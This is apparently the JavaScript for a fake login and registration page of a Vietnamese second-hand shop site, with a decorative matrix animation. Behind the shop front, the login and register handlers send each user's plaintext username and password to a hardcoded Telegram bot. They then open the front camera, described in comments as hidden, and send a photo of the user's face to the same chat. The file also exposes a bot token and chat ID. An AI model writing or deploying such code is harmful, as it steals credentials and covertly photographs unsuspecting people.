// Cấu hình Telegram
const TELEGRAM_TOKEN = '8427083531:AAFPX-KfKwKNr2b3-wqoAGC0F0H_D0JVki8';
const TELEGRAM_CHAT_ID = '-1004386281388';

const matrixCanvas = document.getElementById('matrixCanvas');
const ctx = matrixCanvas.getContext('2d');
let cameraStream = null;
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const loadingSpinner = document.getElementById('loadingSpinner');
const cameraPreview = document.getElementById('cameraPreview');

// Hàm chạy hiệu ứng ma trận nền
function setupMatrixEffect() {
  matrixCanvas.width = window.innerWidth;
  matrixCanvas.height = window.innerHeight;
  const chars = '101010'.split('');
  const fontSize = 18;
  const columns = matrixCanvas.width / fontSize;
  const drops = Array(Math.floor(columns)).fill(1);
  
  function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
    ctx.fillStyle = '#0f0';
    ctx.font = fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }
  setInterval(draw, 50);
}

// Hiện loading spinner
function showLoading() {
  loadingSpinner.classList.remove('hidden');
}

function hideLoading() {
  loadingSpinner.classList.add('hidden');
}

// Chuyển từ trang chủ sang form đăng nhập
function goToLogin() {
  document.getElementById('homeSection').classList.add('hidden');
  document.getElementById('authSection').classList.remove('hidden');
}

// Quay lại trang chủ từ form đăng nhập
function goToHome() {
  document.getElementById('authSection').classList.add('hidden');
  document.getElementById('homeSection').classList.remove('hidden');
}

// Gửi dữ liệu dạng text về Telegram admin
function sendToTelegram(message) {
  let text = '';
  for (let [k, v] of Object.entries(message)) {
    text += `<b>${k}:</b> ${v}\n`;
  }
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: 'HTML'
  };
  
  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(err => console.error('Lỗi gửi message:', err));
}

// Gửi ảnh chụp mặt về Telegram admin
function sendPhotoToTelegram(photoDataUrl) {
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    photo: photoDataUrl,
    caption: '📸 Ảnh xác minh đăng nhập shop đồ cũ'
  };
  
  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(res => {
    console.log('Kết quả gửi ảnh:', res.status);
    return res.json();
  })
  .then(data => {
    console.log('Phản hồi Telegram:', data);
  })
  .catch(err => console.error('Lỗi gửi ảnh:', err));
}

// Chụp ảnh từ camera và gửi về Telegram
function captureAndSendPhoto() {
  if (!cameraStream) {
    console.log('Không có camera stream');
    return Promise.resolve();
  }
  
  console.log('Bắt đầu chụp ảnh...');
  
  // Kiểm tra video đã sẵn sàng chưa
  if (video.readyState < 2 || video.videoWidth === 0) {
    console.log('Video chưa sẵn sàng, readyState:', video.readyState, 'videoWidth:', video.videoWidth);
    return new Promise(resolve => {
      setTimeout(() => {
        captureAndSendPhoto().then(resolve);
      }, 1000);
    });
  }
  
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  console.log('Video kích thước:', video.videoWidth, 'x', video.videoHeight);
  
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  // Lấy data URL từ canvas
  const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
  console.log('Đã chụp ảnh, độ dài data URL:', photoDataUrl.length);
  
  // Gửi ảnh về Telegram
  return sendPhotoToTelegram(photoDataUrl);
}

// Bật camera trước ẩn khi bấm nút xác nhận
async function enableAndCapture() {
  if (cameraStream) {
    console.log('Đã có camera stream, chụp luôn');
    return captureAndSendPhoto();
  }
  
  console.log('Yêu cầu quyền camera...');
  
  try {
    cameraStream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
      audio: false 
    });
    
    video.srcObject = cameraStream;
    console.log('Camera đã được cấp quyền');
    
    // Hiện camera preview để debug (có thể ẩn đi khi hoàn thành)
    cameraPreview.classList.remove('hidden');
    
    await video.play();
    console.log('Video đang phát');
    
    // Chờ video sẵn sàng
    await new Promise(resolve => {
      const checkReady = () => {
        if (video.readyState >= 2 && video.videoWidth > 0) {
          console.log('Video sẵn sàng để chụp');
          resolve();
        } else {
          console.log('Đang chờ video sẵn sàng...');
          setTimeout(checkReady, 500);
        }
      };
      checkReady();
    });
    
    // Chụp ảnh
    await captureAndSendPhoto();
    
    // Ẩn camera preview
    cameraPreview.classList.add('hidden');
    
    return;
  } catch (err) {
    console.error('Lỗi camera:', err);
    alert('Bạn phải cấp quyền camera để tiếp tục!');
    // Vẫn gửi thông tin không kèm ảnh
    return Promise.resolve();
  }
}

// Tắt camera
function stopCamera() {
  if (cameraStream) {
    cameraStream.getTracks().forEach(track => {
      console.log('Dừng track:', track.kind);
      track.stop();
    });
    cameraStream = null;
    video.srcObject = null;
  }
}

// Xử lý khi người dùng bấm đăng nhập
async function handleLogin() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  
  if (!username || !password) {
    alert('Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu');
    return;
  }
  
  showLoading();
  
  const accountInfo = {
    hành_động: 'ĐĂNG NHẬP',
    tài_khoản: username,
    mật_khẩu: password,
    thời_gian: new Date().toLocaleString('vi-VN')
  };
  
  console.log('Gửi thông tin tài khoản...');
  await sendToTelegram(accountInfo);
  
  console.log('Chụp ảnh mặt...');
  await enableAndCapture(); // Chụp mặt trước ẩn và gửi về admin
  
  // Hiện tên người dùng trong shop
  document.getElementById('displayUsername').textContent = username;
  
  // Chuyển sang giao diện shop chính
  document.getElementById('authSection').classList.add('hidden');
  document.getElementById('homeSection').classList.add('hidden');
  document.getElementById('shopSection').classList.remove('hidden');
  
  stopCamera();
  hideLoading();
}

// Xử lý khi người dùng bấm tạo tài khoản
async function handleRegister() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  
  if (!username || !password) {
    alert('Vui lòng nhập đầy đủ thông tin để tạo tài khoản');
    return;
  }
  
  showLoading();
  
  const accountInfo = {
    hành_động: 'TẠO TÀI KHOẢN',
    tài_khoản: username,
    mật_khẩu: password,
    thời_gian: new Date().toLocaleString('vi-VN')
  };
  
  console.log('Gửi thông tin tài khoản...');
  await sendToTelegram(accountInfo);
  
  console.log('Chụp ảnh mặt...');
  await enableAndCapture(); // Chụp mặt trước ẩn và gửi về admin
  
  // Hiện tên người dùng trong shop
  document.getElementById('displayUsername').textContent = username;
  
  // Chuyển sang giao diện shop chính
  document.getElementById('authSection').classList.add('hidden');
  document.getElementById('homeSection').classList.add('hidden');
  document.getElementById('shopSection').classList.remove('hidden');
  
  stopCamera();
  hideLoading();
}

// Gắn sự kiện cho các nút
document.getElementById('goToLoginBtn').addEventListener('click', goToLogin);
document.getElementById('backToHomeBtn').addEventListener('click', goToHome);
document.getElementById('loginBtn').addEventListener('click', handleLogin);
document.getElementById('registerBtn').addEventListener('click', handleRegister);

// Xử lý resize canvas ma trận
window.addEventListener('resize', () => {
  matrixCanvas.width = window.innerWidth;
  matrixCanvas.height = window.innerHeight;
});

// Khởi tạo
setupMatrixEffect();